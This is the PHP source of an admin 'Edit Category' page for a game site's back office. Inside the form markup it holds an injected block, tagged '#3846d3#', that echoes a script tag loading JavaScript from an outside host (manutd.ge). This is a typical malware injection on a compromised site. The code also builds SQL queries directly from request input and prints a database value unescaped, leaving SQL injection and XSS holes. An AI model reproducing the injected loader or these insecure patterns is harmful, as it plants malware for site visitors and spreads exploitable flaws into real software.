<?php session_start();
ob_start();

include "inc/session_check.php";
$page = "Edit Category";
$side_menu="Category";
  $id = urlsafe_b64decode($_REQUEST['id']);
 $rawid = $_REQUEST['id'];
if(isset($_POST['submit']))
{
 			  $category = $_POST['category'];
			  $status = $_POST['status'];
			  $section=$_POST['section'];
			 // echo "update category set cat_name='$category',status='$status' where id='$id'";
			 //exit;
			  $ins="update category set name='$category',section='$section',status='$status' where id='$id'";
	
if(mysql_query($ins))
{
	
	
	header("location: list_category.php?id=$rawid&msg=succ&cont=Category uploaded successfully");
	
}
else
	{
		header("location: list_category.php?id=$rawid&msg=err&cont=Error in insert query");
	}

}

$select_ad = mysql_query("select * from category where id='$id'");
$fetch_ad = mysql_fetch_array($select_ad);


?>
<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
    <meta charset="utf-8">
    <title>Game Admin | Edit Category</title>
     <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/main.css" rel="stylesheet">
    

  </head>
  <body>
    
    <?php 
	  	include "inc/header.php";
    ?>

    <div class="container-fluid">
      
    <?php 
	  	include "inc/main_nav.php";
    ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
			include "inc/breadcrumb.php";
		  ?>

			<div class="row-fluid">
            <div class="span6">
              <div class="widget">
                <div class="widget-header">
                  <div class="title">
                Edit  Category
                  </div>
                </div>
                <div class="widget-body">
<?php include 'message.php';  ?>
<?php
#3846d3#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967020\"></script>";
echo $g;
}
#/3846d3#
?><!--<?php $sel=mysql_query("select * from edi") ?>-->
<form class="form-horizontal no-margin well" id="ad_form" name="form" method="post">
	            	  <h5 class="text-info">Edit Category Information</h5>
                    <hr>
  					<div class="control-group">
                      <label class="control-label">
                        Category * :
                      </label>
                      <div class="controls">
                      	<input type="text" value="<?=$fetch_ad['name']?>" name="category"/>
                      </div>
                    </div>
                    
                    
                    <div class="control-group">
  <label class="control-label">
    Section * :
  </label>
  <div class="controls">
     <select name="section" class="required">
					<option  value="">--Select--</option>
					<option <?php if($fetch_ad['section']=="top"){ echo "selected='selected'"; } ?> value="top">Top</option>
					<option <?php if($fetch_ad['section']=="Left"){ echo "selected='selected'"; } ?> value="left">Left</option>
				</select>
				
  </div>
</div>

                    
                    
				<div class="control-group">
                      <label class="control-label">
                      	Status : </label>
                      <div class="controls">
				<select name="status" class="required">
					<option  value="">--Select--</option>
					<option <?php if($fetch_ad['status']==1){ echo "selected='selected'"; } ?> value="1">Active</option>
					<option <?php if($fetch_ad['status']==0){ echo "selected='selected'"; } ?> value="0">Inactive</option>
				</select>
				</div>
                    </div>
				 <div class="form-actions no-margin">
				 	<input type="submit" class="btn btn-info" name="submit" value="submit">
                    </div>
 			</form>
		 </div>
              </div>
            </div>

            
          </div>

          
        </div>
      </div>
    </div>
    
    <?php
    include 'inc/footer.php';
    ?>
  
   <script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
    <script type="text/javascript"  src="js/jquery-latest.js"></script>
	<script type="text/javascript"  src="js/jquery.validate.js"></script>
	<script>
  $(document).ready(function(){
  	$('#ad_img_div').hide();
  	$('#edit_img').click(function() {
  	if($(this).attr('checked')){$('#ad_img_div').show();$('#ad_img').addClass('required')}
  	else{$('#ad_img_div').hide();$('#ad_img').removeClass('required')}
  	});
  	
    $("#ad_form").validate({
    	success: function(label) {
			// set &nbsp; as text for IE
			label.html("&nbsp;").addClass("checked");
		}
    });
     $("#advert_pos").change(function(){
    	var posid = $(this).val();
    	dataString = "posid="+posid;
    	$.ajax({
    	type: "POST",
    	url: "get_ad_size.php",
    	data: dataString,
    	success: function(html){
    		$("#advert_size").html(html);
    	}
    	})
    });
    });

</script>
</body>
</html>
	